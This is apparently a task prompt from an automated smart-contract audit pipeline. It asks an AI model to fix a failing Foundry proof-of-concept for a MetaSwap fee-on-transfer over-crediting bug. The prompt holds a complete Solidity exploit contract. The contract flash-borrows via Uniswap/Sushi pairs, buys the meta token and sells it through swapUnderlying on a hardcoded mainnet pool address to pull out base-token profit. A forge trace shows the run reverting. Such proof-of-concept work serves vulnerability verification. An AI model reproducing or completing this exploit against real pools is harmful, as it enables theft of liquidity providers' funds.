You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: MetaSwap underlying swaps over-credit fee-on-transfer meta tokens
- claim: `swapUnderlying()` measures the actual amount received into `v.dx`, but when the sold asset is a meta-level pooled token it still prices the trade from the caller-supplied `dx` instead of the post-fee `v.dx`. A fee-on-transfer or burnable meta token therefore lets the caller receive output for tokens the pool never received.
- impact: If a meta pool ever lists a deflationary meta token, an attacker can repeatedly swap that token into other assets and drain real pool reserves.
- exploit_paths: ["MetaSwap.swapUnderlying -> MetaSwapUtils.swapUnderlying with `tokenIndexFrom < baseLPTokenIndex`", "Sell a fee-on-transfer meta token so actual receipt is `v.dx < dx`, but AMM math still credits `dx`", "Receive full-priced output backed by insufficient input"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMetaSwapLike {
    function getToken(uint8 index) external view returns (address);
    function getTokenBalance(uint8 index) external view returns (uint256);
    function calculateSwapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx) external view returns (uint256);
    function swapUnderlying(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
    function metaSwapStorage() external view returns (address baseSwap, uint256 baseVirtualPrice, uint256 baseCacheLastUpdated);
}

interface IBaseSwapLike {
    function getToken(uint8 index) external view returns (address);
    function getTokenBalance(uint8 index) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    uint8 private constant META_TOKEN_INDEX = 0;
    uint8 private constant BASE_LP_TOKEN_INDEX = 1;
    uint8 private constant CALLBACK_MODE_BASE_FLASH = 1;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    struct PairCandidate {
        address pair;
        uint256 reserve;
    }

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;

    address private callbackPair;
    address private callbackBorrowToken;
    uint256 private callbackPreBorrowTokenBalance;
    uint8 private callbackBaseIndex;
    uint8 private callbackMode;
    bool private callbackEntered;

    constructor() {}

    function executeOnOpportunity() external {
        realizedProfitToken = address(0);
        realizedProfitAmount = 0;

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);
        uint8 baseCount = _countBaseTokens(baseSwap);
        if (baseCount == 0) {
            return;
        }

        address metaToken = target.getToken(META_TOKEN_INDEX);
        uint256[8] memory divisors = [uint256(512), 256, 128, 64, 32, 16, 8, 4];

        // Strategy: direct_or_existing_balance_first.
        // 1) Prefer directly selling any verifier-held meta token through the exact
        //    vulnerable path: `swapUnderlying(meta -> base)` with
        //    `tokenIndexFrom == META_TOKEN_INDEX < baseLPTokenIndex`.
        uint256 heldMeta = IERC20Like(metaToken).balanceOf(address(this));
        if (heldMeta > 0) {
            for (uint8 baseIndex = 0; baseIndex < baseCount; ++baseIndex) {
                for (uint256 i = 0; i < divisors.length; ++i) {
                    uint256 sellAmount = heldMeta / divisors[i];
                    if (sellAmount == 0) {
                        continue;
                    }
                    if (!_hasUnderlyingQuote(target, baseIndex, sellAmount)) {
                        continue;
                    }

                    try this.attemptDirectMetaDrain(baseIndex, sellAmount) {
                        if (realizedProfitAmount > 0) {
                            return;
                        }
                    } catch {}
                }
            }
        }

        // 2) If no held exploit asset exists, use any verifier-held base token to
        //    buy the already-listed meta token, then immediately invoke the same
        //    vulnerable meta->base leg. This only changes funding, not causality.
        for (uint8 baseIndex = 0; baseIndex < baseCount; ++baseIndex) {
            address baseToken = baseSwap.getToken(baseIndex);
            uint256 heldBase = IERC20Like(baseToken).balanceOf(address(this));
            if (heldBase == 0) {
                continue;
            }

            for (uint256 i = 0; i < divisors.length; ++i) {
                uint256 bootstrapAmount = heldBase / divisors[i];
                if (bootstrapAmount == 0) {
                    continue;
                }
                if (!_hasUnderlyingQuote(target, baseIndex, bootstrapAmount)) {
                    continue;
                }

                try this.attemptHeldBaseBootstrap(baseIndex, bootstrapAmount) {
                    if (realizedProfitAmount > 0) {
                        return;
                    }
                } catch {}
            }
        }

        // 3) Only if direct execution with verifier-held assets is infeasible, use a
        //    realistic public flash swap to temporarily source a base underlying,
        //    bootstrap the listed meta token, and then execute the same vulnerable
        //    `swapUnderlying(meta -> base)` sell.
        for (uint8 baseIndex = 0; baseIndex < baseCount; ++baseIndex) {
            address baseToken = baseSwap.getToken(baseIndex);
            PairCandidate memory pairCandidate = _findBestBorrowPair(baseToken);
            if (pairCandidate.pair == address(0) || pairCandidate.reserve == 0) {
                continue;
            }

            uint256 cap = _capBorrowAmount(target, baseSwap, baseIndex, pairCandidate.reserve);
            if (cap == 0) {
                continue;
            }

            for (uint256 i = 0; i < divisors.length; ++i) {
                uint256 borrowAmount = cap / divisors[i];
                if (borrowAmount == 0) {
                    continue;
                }
                if (!_roundTripHasLiquidity(target, baseIndex, borrowAmount)) {
                    continue;
                }

                try this.startBaseFlash(baseIndex, pairCandidate.pair, borrowAmount) {
                    if (realizedProfitAmount > 0) {
                        return;
                    }
                } catch {}
            }
        }
    }

    function attemptDirectMetaDrain(uint8 baseIndex, uint256 sellAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(sellAmount > 0, "NO_META");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);
        address baseToken = baseSwap.getToken(baseIndex);

        uint256 preBase = IERC20Like(baseToken).balanceOf(address(this));
        _exploitSellMetaForBase(baseIndex, sellAmount);
        uint256 postBase = IERC20Like(baseToken).balanceOf(address(this));

        require(postBase > preBase, "NO_NET_PROFIT");
        realizedProfitToken = baseToken;
        realizedProfitAmount = postBase - preBase;
    }

    function attemptHeldBaseBootstrap(uint8 baseIndex, uint256 bootstrapAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(bootstrapAmount > 0, "NO_BASE");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);
        address metaToken = target.getToken(META_TOKEN_INDEX);
        address baseToken = baseSwap.getToken(baseIndex);
        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + baseIndex);

        uint256 preBase = IERC20Like(baseToken).balanceOf(address(this));
        uint256 preMeta = IERC20Like(metaToken).balanceOf(address(this));

        _forceApprove(baseToken, TARGET, bootstrapAmount);
        target.swapUnderlying(flatBaseIndex, META_TOKEN_INDEX, bootstrapAmount, 0, block.timestamp);

        uint256 metaBought = IERC20Like(metaToken).balanceOf(address(this)) - preMeta;
        require(metaBought > 0, "NO_META_BOUGHT");

        _exploitSellMetaForBase(baseIndex, metaBought);

        uint256 postBase = IERC20Like(baseToken).balanceOf(address(this));
        require(postBase > preBase, "NO_NET_PROFIT");

        realizedProfitToken = baseToken;
        realizedProfitAmount = postBase - preBase;
    }

    function startBaseFlash(uint8 baseIndex, address pair, uint256 borrowAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(pair != address(0) && borrowAmount > 0, "BAD_FLASH_PLAN");
        require(!callbackEntered, "CALLBACK_BUSY");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);
        address baseToken = baseSwap.getToken(baseIndex);

        require(_pairContainsToken(pair, baseToken), "PAIR_MISMATCH");

        callbackPair = pair;
        callbackBorrowToken = baseToken;
        callbackPreBorrowTokenBalance = IERC20Like(baseToken).balanceOf(address(this));
        callbackBaseIndex = baseIndex;
        callbackMode = CALLBACK_MODE_BASE_FLASH;
        callbackEntered = true;

        address token0 = IUniswapV2PairLike(pair).token0();
        bytes memory data = abi.encode(CALLBACK_MODE_BASE_FLASH);
        if (token0 == baseToken) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), data);
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), data);
        }

        callbackPair = address(0);
        callbackBorrowToken = address(0);
        callbackPreBorrowTokenBalance = 0;
        callbackBaseIndex = 0;
        callbackMode = 0;
        callbackEntered = false;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == callbackPair, "UNEXPECTED_PAIR");
        require(sender == address(this), "UNEXPECTED_SENDER");
        require(callbackEntered, "NO_CALLBACK");
        require(abi.decode(data, (uint8)) == callbackMode, "BAD_MODE");

        if (callbackMode == CALLBACK_MODE_BASE_FLASH) {
            _executeBaseFlashCallback(amount0 > 0 ? amount0 : amount1);
            return;
        }

        revert("UNKNOWN_MODE");
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _executeBaseFlashCallback(uint256 borrowedGross) internal {
        require(borrowedGross > 0, "NO_BORROWED_AMOUNT");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);

        address baseToken = callbackBorrowToken;
        address metaToken = target.getToken(META_TOKEN_INDEX);
        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + callbackBaseIndex);

        uint256 borrowedActual = IERC20Like(baseToken).balanceOf(address(this)) - callbackPreBorrowTokenBalance;
        require(borrowedActual > 0, "NO_BORROW_RECEIVED");

        uint256 preMeta = IERC20Like(metaToken).balanceOf(address(this));
        _forceApprove(baseToken, TARGET, borrowedActual);
        target.swapUnderlying(flatBaseIndex, META_TOKEN_INDEX, borrowedActual, 0, block.timestamp);

        uint256 metaBought = IERC20Like(metaToken).balanceOf(address(this)) - preMeta;
        require(metaBought > 0, "BOOTSTRAP_FAILED");

        _exploitSellMetaForBase(callbackBaseIndex, metaBought);

        uint256 repayAmount = _sameTokenFlashRepay(borrowedGross);
        uint256 currentBase = IERC20Like(baseToken).balanceOf(address(this));
        require(currentBase >= callbackPreBorrowTokenBalance + repayAmount, "NO_NET_PROFIT_AFTER_REPAY");

        _safeTransfer(baseToken, callbackPair, repayAmount);

        uint256 finalBase = IERC20Like(baseToken).balanceOf(address(this));
        require(finalBase > callbackPreBorrowTokenBalance, "ZERO_PROFIT");

        realizedProfitToken = baseToken;
        realizedProfitAmount = finalBase - callbackPreBorrowTokenBalance;
    }

    function _exploitSellMetaForBase(uint8 baseIndex, uint256 metaAmount) internal returns (uint256 baseOut) {
        require(metaAmount > 0, "NO_META_INPUT");

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        (address baseSwapAddr,,) = target.metaSwapStorage();
        IBaseSwapLike baseSwap = IBaseSwapLike(baseSwapAddr);
        address metaToken = target.getToken(META_TOKEN_INDEX);
        address baseToken = baseSwap.getToken(baseIndex);
        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + baseIndex);

        // Exploit path alignment:
        // 1) Call MetaSwap.swapUnderlying with `tokenIndexFrom < baseLPTokenIndex`
        //    by selling the meta-level token at index 0.
        // 2) Because the token is fee-on-transfer/deflationary, the pool only
        //    receives `actualPoolReceipt < metaAmount`.
        // 3) The vulnerable MetaSwapUtils branch still prices the trade from the
        //    caller-supplied `dx == metaAmount`, so the contract receives output
        //    backed by insufficient input.
        uint256 preBase = IERC20Like(baseToken).balanceOf(address(this));
        uint256 poolMetaBefore = IERC20Like(metaToken).balanceOf(TARGET);

        _forceApprove(metaToken, TARGET, metaAmount);
        baseOut = target.swapUnderlying(META_TOKEN_INDEX, flatBaseIndex, metaAmount, 0, block.timestamp);
        require(baseOut > 0, "EXPLOIT_SWAP_FAILED");

        uint256 poolMetaAfter = IERC20Like(metaToken).balanceOf(TARGET);
        require(poolMetaAfter > poolMetaBefore, "NO_META_RECEIPT");
        uint256 actualPoolReceipt = poolMetaAfter - poolMetaBefore;
        require(actualPoolReceipt < metaAmount, "META_NOT_FEE_ON_TRANSFER");

        uint256 postBase = IERC20Like(baseToken).balanceOf(address(this));
        require(postBase > preBase, "NO_BASE_GAIN");
    }

    function _findBestBorrowPair(address token) internal view returns (PairCandidate memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory common = [WETH, DAI, USDC, USDT, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < common.length; ++j) {
                address other = common[j];
                if (other == token) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(token, other);
                if (pair == address(0)) {
                    continue;
                }

                uint256 reserve = _pairReserveOf(pair, token);
                if (reserve > best.reserve) {
                    best = PairCandidate({pair: pair, reserve: reserve});
                }
            }
        }
    }

    function _capBorrowAmount(
        IMetaSwapLike target,
        IBaseSwapLike baseSwap,
        uint8 baseIndex,
        uint256 pairReserve
    ) internal view returns (uint256) {
        uint256 cap = pairReserve / 8;

        uint256 basePoolBalance;
        try baseSwap.getTokenBalance(baseIndex) returns (uint256 bal) {
            basePoolBalance = bal;
        } catch {
            basePoolBalance = 0;
        }
        if (basePoolBalance != 0) {
            uint256 poolCap = basePoolBalance / 4;
            if (cap == 0 || (poolCap != 0 && poolCap < cap)) {
                cap = poolCap;
            }
        }

        uint256 metaPoolBalance;
        try target.getTokenBalance(META_TOKEN_INDEX) returns (uint256 bal) {
            metaPoolBalance = bal;
        } catch {
            metaPoolBalance = 0;
        }
        if (metaPoolBalance != 0) {
            uint256 metaCap = metaPoolBalance / 2;
            if (cap == 0 || (metaCap != 0 && metaCap < cap)) {
                cap = metaCap;
            }
        }

        return cap;
    }

    function _hasUnderlyingQuote(IMetaSwapLike target, uint8 baseIndex, uint256 metaIn) internal view returns (bool) {
        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + baseIndex);
        try target.calculateSwapUnderlying(META_TOKEN_INDEX, flatBaseIndex, metaIn) returns (uint256 quotedBase) {
            return quotedBase > 0;
        } catch {
            return false;
        }
    }

    function _roundTripHasLiquidity(IMetaSwapLike target, uint8 baseIndex, uint256 baseIn) internal view returns (bool) {
        uint8 flatBaseIndex = uint8(BASE_LP_TOKEN_INDEX + baseIndex);
        uint256 metaOut;
        try target.calculateSwapUnderlying(flatBaseIndex, META_TOKEN_INDEX, baseIn) returns (uint256 quotedMeta) {
            metaOut = quotedMeta;
        } catch {
            return false;
        }
        if (metaOut == 0) {
            return false;
        }

        try target.calculateSwapUnderlying(META_TOKEN_INDEX, flatBaseIndex, metaOut) returns (uint256 quotedBase) {
            return quotedBase > 0;
        } catch {
            return false;
        }
    }

    function _countBaseTokens(IBaseSwapLike baseSwap) internal view returns (uint8 count) {
        for (uint8 i = 0; i < 8; ++i) {
            try baseSwap.getToken(i) returns (address token) {
                if (token == address(0)) {
                    break;
                }
                unchecked {
                    ++count;
                }
            } catch {
                break;
            }
        }
    }

    function _pairContainsToken(address pair, address token) internal view returns (bool) {
        return IUniswapV2PairLike(pair).token0() == token || IUniswapV2PairLike(pair).token1() == token;
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            return uint256(reserve0);
        }
        if (IUniswapV2PairLike(pair).token1() == token) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _sameTokenFlashRepay(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_didSucceed(ok, data)) {
            return;
        }
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(_didSucceed(ok, data), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(_didSucceed(ok, data), "TRANSFER_FAILED");
    }

    function _didSucceed(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```
0000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000046e89118ee493183d4b7
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   │   │   │   ├─ [26801] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491, 335885280002 [3.358e11])
    │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000acb83e0633d6605c5001e2ab59ef3c745547c8c7
    │   │   │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000824dcd7b044d60df2e89b1bb888e66d8bcf41491
    │   │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x43fb02998f4e03da2e0e6fff53fdbf0c40a9f45f145dc377fc30615d7d7a8a64
    │   │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000824dcd7b044d60df2e89b1bb888e66d8bcf41491
    │   │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000046e89118ee493183d4b70000000000000000000000000000000000000000000edd3e4ab2eeb9a38f64aa00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 335885280002 [3.358e11]
    │   │   │   │   │   │   ├─ [24801] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 335885280002 [3.358e11])
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000824dcd7b044d60df2e89b1bb888e66d8bcf41491
    │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   ├─  emit topic 0: 0x6617207207e397b41fc98016d8c9febb7223f44c355db66ad429730f2b950a60
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000470440edb6335522aee00000000000000000000000000000000000000000000000000000004e3452a30200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000004e3452a302
    │   │   │   │   │   └─ ← [Return] 335885280002 [3.358e11]
    │   │   │   │   ├─ [2455] 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51::balanceOf(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491) [staticcall]
    │   │   │   │   │   ├─ [1431] 0x7df9b3f8f1C011D8BD707430e97E747479DD532a::balanceOf(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491)
    │   │   │   │   │   │   ├─ [497] 0x05a9CBe762B36632b3594DA4F082340E0e5343e8::balanceOf(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 8133884478747092063607602 [8.133e24]
    │   │   │   │   │   │   └─ ← [Return] 8133884478747092063607602 [8.133e24]
    │   │   │   │   │   └─ ← [Return] 8133884478747092063607602 [8.133e24]
    │   │   │   │   └─ ← [Revert] META_NOT_FEE_ON_TRANSFER
    │   │   │   └─ ← [Revert] META_NOT_FEE_ON_TRANSFER
    │   │   └─ ← [Revert] META_NOT_FEE_ON_TRANSFER
    │   └─ ← [Stop]
    ├─ [339] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [363] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852.swap
  at FlawVerifier.startBaseFlash
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.61s (504.46ms CPU time)

Ran 1 test suite in 2.63s (2.61s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 20440044)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
